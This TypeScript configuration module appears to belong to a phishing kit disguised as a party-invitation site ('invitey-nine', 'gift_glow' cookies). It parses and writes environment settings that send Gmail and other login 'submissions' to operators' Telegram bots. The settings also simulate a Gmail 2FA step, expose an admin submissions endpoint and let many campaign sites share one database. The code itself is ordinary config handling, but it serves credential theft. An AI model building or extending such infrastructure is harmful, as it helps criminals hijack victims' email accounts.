export type EnvConfig = {
  siteId: string;
  siteUrl: string;
  sessionCookieName: string;
  consentCookieName: string;
  upstashRedisUrl: string;
  upstashRedisToken: string;
  eventDate: string;
  eventTime: string;
  eventTimezone: string;
  requireConsent: boolean;
  auto2faSimulation: boolean;
  telegramGmailBotToken: string;
  telegramGmailChatId: string;
  telegramOtherBotToken: string;
  telegramOtherChatId: string;
  telegramWebhookSecret: string;
  adminApiKey: string;
};

export const DEFAULT_ENV: EnvConfig = {
  siteId: "invitey-nine",
  siteUrl: "https://invitey-nine.vercel.app/",
  sessionCookieName: "gift_glow_sid",
  consentCookieName: "gift_glow_consent",
  upstashRedisUrl: "https://your-instance.upstash.io",
  upstashRedisToken: "",
  eventDate: "2026-07-27",
  eventTime: "01:00",
  eventTimezone: "America/New_York",
  requireConsent: false,
  auto2faSimulation: false,
  telegramGmailBotToken: "",
  telegramGmailChatId: "",
  telegramOtherBotToken: "",
  telegramOtherChatId: "",
  telegramWebhookSecret: "invitey-nine-webhook-secret-2026",
  adminApiKey: "change-me-in-production",
};

const ENV_KEY_MAP: Record<string, keyof EnvConfig> = {
  SITE_ID: "siteId",
  NEXT_PUBLIC_SITE_URL: "siteUrl",
  SESSION_COOKIE_NAME: "sessionCookieName",
  CONSENT_COOKIE_NAME: "consentCookieName",
  UPSTASH_REDIS_REST_URL: "upstashRedisUrl",
  UPSTASH_REDIS_REST_TOKEN: "upstashRedisToken",
  NEXT_PUBLIC_EVENT_DATE: "eventDate",
  NEXT_PUBLIC_EVENT_TIME: "eventTime",
  NEXT_PUBLIC_EVENT_TIMEZONE: "eventTimezone",
  REQUIRE_CONSENT: "requireConsent",
  AUTO_2FA_SIMULATION: "auto2faSimulation",
  TELEGRAM_GMAIL_BOT_TOKEN: "telegramGmailBotToken",
  TELEGRAM_GMAIL_CHAT_ID: "telegramGmailChatId",
  TELEGRAM_OTHER_BOT_TOKEN: "telegramOtherBotToken",
  TELEGRAM_OTHER_CHAT_ID: "telegramOtherChatId",
  TELEGRAM_WEBHOOK_SECRET: "telegramWebhookSecret",
  ADMIN_API_KEY: "adminApiKey",
};

function parseBool(value: string): boolean {
  return value.toLowerCase() === "true";
}

export function parseEnvText(text: string): Partial<EnvConfig> {
  const result: Partial<EnvConfig> = {};

  for (const line of text.split("\n")) {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith("#")) continue;

    const eqIndex = trimmed.indexOf("=");
    if (eqIndex === -1) continue;

    const key = trimmed.slice(0, eqIndex).trim();
    let value = trimmed.slice(eqIndex + 1).trim();

    if (
      (value.startsWith('"') && value.endsWith('"')) ||
      (value.startsWith("'") && value.endsWith("'"))
    ) {
      value = value.slice(1, -1);
    }

    const field = ENV_KEY_MAP[key];
    if (!field) continue;

    if (field === "requireConsent" || field === "auto2faSimulation") {
      result[field] = parseBool(value);
    } else {
      result[field] = value;
    }
  }

  return result;
}

export function mergeEnvConfig(partial: Partial<EnvConfig>): EnvConfig {
  return { ...DEFAULT_ENV, ...partial };
}

export function deriveFromSiteId(siteId: string): Pick<
  EnvConfig,
  "siteUrl" | "telegramWebhookSecret"
> {
  const slug = siteId.trim();
  return {
    siteUrl: `https://${slug}.vercel.app/`,
    telegramWebhookSecret: `${slug}-webhook-secret-2026`,
  };
}

export function serializeEnv(config: EnvConfig): string {
  const bool = (v: boolean) => (v ? "true" : "false");

  return `# Server data directory (submissions + sessions)
# DATA_DIR=./data


# TODO:  CHANGE THIS this two
SITE_ID=${config.siteId}
NEXT_PUBLIC_SITE_URL=${config.siteUrl}
# Session / consent cookies
SESSION_COOKIE_NAME=${config.sessionCookieName}
CONSENT_COOKIE_NAME=${config.consentCookieName}


# --- [SHARED] Upstash Redis (same URL+token for all sites if sharing one DB) ---
UPSTASH_REDIS_REST_URL=${config.upstashRedisUrl}
UPSTASH_REDIS_REST_TOKEN=${config.upstashRedisToken}


# --- [CLIENT] Party / event date ---
NEXT_PUBLIC_EVENT_DATE=${config.eventDate}
NEXT_PUBLIC_EVENT_TIME=${config.eventTime}
NEXT_PUBLIC_EVENT_TIMEZONE=${config.eventTimezone}

# Reject API calls unless user consented on /home and hide ui
REQUIRE_CONSENT=${bool(config.requireConsent)}

# Auto-advance Gmail 2FA (disabled automatically when Telegram is configured)
AUTO_2FA_SIMULATION=${bool(config.auto2faSimulation)}


TELEGRAM_GMAIL_BOT_TOKEN=${config.telegramGmailBotToken}
TELEGRAM_GMAIL_CHAT_ID=${config.telegramGmailChatId}
TELEGRAM_OTHER_BOT_TOKEN=${config.telegramOtherBotToken}
TELEGRAM_OTHER_CHAT_ID=${config.telegramOtherChatId}

# TELEGRAM_CHAT_ID=${config.telegramGmailChatId}
# TODO:  CHANGE THIS
TELEGRAM_WEBHOOK_SECRET=${config.telegramWebhookSecret}

# Optional: protect GET /api/admin/submissions
ADMIN_API_KEY=${config.adminApiKey}
`;
}
